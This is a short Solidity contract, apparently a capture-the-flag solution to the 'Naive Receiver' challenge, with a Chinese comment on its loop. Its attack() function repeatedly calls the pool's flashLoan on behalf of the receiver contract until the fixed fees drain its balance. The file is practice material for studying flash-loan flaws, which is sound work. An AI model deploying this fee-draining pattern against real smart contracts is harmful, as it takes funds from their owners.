pragma solidity 0.8.17;

import "../naive-receiver/FlashLoanReceiver.sol";
import "../naive-receiver/NaiveReceiverLenderPool.sol";

contract NaiveReceiverAttack {
    NaiveReceiverLenderPool pool;
    FlashLoanReceiver receiver;

    constructor(address payable _pool, address payable _receiver) {
        pool = NaiveReceiverLenderPool(_pool);
        receiver = FlashLoanReceiver(_receiver);
    }

    function attack() external {
        // 只要發現 FlashLoanReceiver 裡的餘額大於 fixedFee 就執行 flashLoan
        while (address(receiver).balance >= pool.fixedFee()) {
            pool.flashLoan(address(receiver), 0);
        }
    }
}
